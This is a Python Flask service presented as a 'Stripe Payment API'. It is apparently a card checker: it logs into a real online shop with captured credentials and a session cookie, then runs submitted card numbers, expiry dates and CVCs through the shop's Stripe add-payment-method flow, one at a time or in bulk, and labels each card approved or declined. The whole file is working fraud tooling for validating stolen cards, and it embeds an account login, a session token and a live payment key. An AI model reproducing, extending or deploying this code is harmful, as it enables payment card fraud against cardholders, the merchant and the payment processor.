from flask import Flask, request, jsonify
import requests
import json
import re
import os
import time

app = Flask(__name__)

# Configuration from environment variables
API_KEY = os.environ.get('API_KEY', 'yashikaaa')
PORT = int(os.environ.get('PORT', 8080))

# Working credentials from your capture
USERNAME = os.environ.get('USERNAME', 'jflpw@hi2.in')
PASSWORD = os.environ.get('PASSWORD', 'jflpw@hi2.in')
LOGIN_NONCE = os.environ.get('LOGIN_NONCE', '0cd1c0ce87')

# Base cookies
BASE_COOKIES = {
    'wmc_ip_info': 'eyJjb3VudHJ5IjoiSU4iLCJjdXJyZW5jeV9jb2RlIjoiSU5SIn0%3D',
    'wmc_current_currency': 'INR',
    'wmc_current_currency_old': 'INR',
    'cookie_notice_accepted': 'true',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    '__stripe_mid': '0f57928e-b5df-49b8-bddc-e2e1b027e8c264a831',
}

def process_card(card_number, mm, yy, cvc):
    """Process a single card and return result"""
    
    if len(yy) == 4:
        yy = yy[2:4]
    
    cookies = BASE_COOKIES.copy()
    
    headers = {
        'authority': 'hakfabrications.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        # Step 1: Login
        login_data = {
            'username': USERNAME,
            'password': PASSWORD,
            'rememberme': 'forever',
            'woocommerce-login-nonce': LOGIN_NONCE,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        
        login_response = requests.post('https://hakfabrications.com/my-account/', 
                                        cookies=cookies, headers=headers, data=login_data, timeout=30)
        
        if 'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7' in login_response.cookies:
            cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7'] = login_response.cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7']
        else:
            cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7'] = os.environ.get('WP_COOKIE', 'jflpw%40hi2.in%7C1776847107%7CpYGEnoiGg3k0BmdE0XqMFAfDomJAfD2VQMpbkl046gQ%7C90c35a5f05eb6916600614b838b2df37ebe5182b3ade661f6370a0259d592fa2')
        
        # Step 2: Get nonce
        page_response = requests.get('https://hakfabrications.com/my-account/add-payment-method/', 
                                      cookies=cookies, headers=headers, timeout=30)
        
        nonce = None
        nonce_match = re.search(r'"_ajax_nonce":"([^"]+)"', page_response.text)
        if not nonce_match:
            nonce_match = re.search(r"'ajax_nonce':'([^']+)'", page_response.text)
        if not nonce_match:
            nonce_match = re.search(r'wc_stripe_create_and_confirm_setup_intent_nonce["\']?\s*:\s*["\']([^"\']+)', page_response.text)
        
        if nonce_match:
            nonce = nonce_match.group(1)
        else:
            nonce = 'ca52ddb9c7'
        
        if '__stripe_sid' in page_response.cookies:
            cookies['__stripe_sid'] = page_response.cookies['__stripe_sid']
        else:
            cookies['__stripe_sid'] = 'e99ec91e-fbc8-47a3-afcc-421fe9ea9ff74b630a'
        
        # Step 3: Create Stripe payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        formatted_card = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
        
        stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2Fd50036e08e%3B+stripe-js-v3%2Fd50036e08e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhakfabrications.com&time_on_page=83016&client_attribution_metadata[client_session_id]=f4659103-cb90-478c-ba53-2d73236ab03a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1yN7yJWz6Qu&client_attribution_metadata[elements_session_config_id]=c646146a-f0c2-4ef6-b47d-b7dd5e46e3b9&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=aabaf175-2ac0-46ef-a220-36ed4576219e861f9c&muid={cookies["__stripe_mid"]}&sid={cookies["__stripe_sid"]}&key=pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH&_stripe_version=2025-09-30.clover'
        
        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                         headers=stripe_headers, data=stripe_data, timeout=30)
        stripe_result = stripe_response.json()
        
        if 'id' not in stripe_result:
            error_msg = stripe_result.get('error', {}).get('message', 'Unknown error')
            if 'expired' in error_msg.lower():
                return {"status": "declined", "message": "Expired card"}
            elif 'insufficient' in error_msg.lower():
                return {"status": "declined", "message": "Insufficient funds"}
            elif 'invalid' in error_msg.lower():
                return {"status": "declined", "message": "Invalid card"}
            elif 'declined' in error_msg.lower():
                return {"status": "declined", "message": "Card declined"}
            else:
                return {"status": "declined", "message": error_msg[:50]}
        
        payment_id = stripe_result['id']
        
        # Step 4: Confirm setup intent
        ajax_headers = {
            'authority': 'hakfabrications.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hakfabrications.com',
            'referer': 'https://hakfabrications.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        final_response = requests.post('https://hakfabrications.com/wp-admin/admin-ajax.php',
                                        cookies=cookies, headers=ajax_headers, data=ajax_data, timeout=30)
        final_result = final_response.json()
        
        if final_result.get('success') == True:
            return {"status": "approved", "message": "Success"}
        elif final_result.get('data', {}).get('error'):
            error = final_result['data']['error'].get('message', 'Unknown error')
            if 'expired' in error.lower():
                return {"status": "declined", "message": "Expired card"}
            else:
                return {"status": "declined", "message": error[:50]}
        else:
            return {"status": "declined", "message": "Card declined"}
            
    except requests.exceptions.Timeout:
        return {"status": "declined", "message": "Request timeout"}
    except Exception as e:
        return {"status": "declined", "message": str(e)[:50]}


@app.route('/key=<api_key>/cc=<card_data>', methods=['GET'])
def process_card_api(api_key, card_data):
    if api_key != API_KEY:
        return jsonify({"error": "Invalid API key", "status": "error"}), 401
    
    parts = card_data.split('|')
    if len(parts) != 4:
        return jsonify({
            "card": card_data,
            "gateway": "Stripe",
            "response": "Invalid format. Use: NUMBER|MM|YY|CVC",
            "status": "error"
        })
    
    card_number, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
    result = process_card(card_number, mm, yy, cvc)
    
    return jsonify({
        "card": f"{card_number}|{mm}|{yy}|{cvc}",
        "gateway": "Stripe",
        "response": result.get("message", "Unknown"),
        "status": result.get("status", "declined")
    })


@app.route('/key=<api_key>/cards', methods=['POST'])
def process_multiple_cards(api_key):
    if api_key != API_KEY:
        return jsonify({"error": "Invalid API key"}), 401
    
    data = request.get_json()
    if not data or 'cards' not in data:
        return jsonify({"error": "Missing 'cards' array"}), 400
    
    results = []
    for card in data['cards']:
        parts = card.split('|')
        if len(parts) == 4:
            result = process_card(parts[0], parts[1], parts[2], parts[3])
            results.append({
                "card": card,
                "gateway": "Stripe",
                "response": result.get("message", "Unknown"),
                "status": result.get("status", "declined")
            })
        else:
            results.append({
                "card": card,
                "gateway": "Stripe",
                "response": "Invalid format",
                "status": "error"
            })
    
    return jsonify({"results": results, "total": len(results)})


@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "running", "port": PORT, "service": "Stripe Payment API"})


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "Stripe Payment API",
        "endpoints": {
            "single_card": "/key={API_KEY}/cc=CARD|MM|YY|CVC",
            "bulk_cards": "/key={API_KEY}/cards (POST)",
            "health": "/health"
        },
        "example": f"/key={API_KEY}/cc=4340762018243549|08|2028|335"
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False)
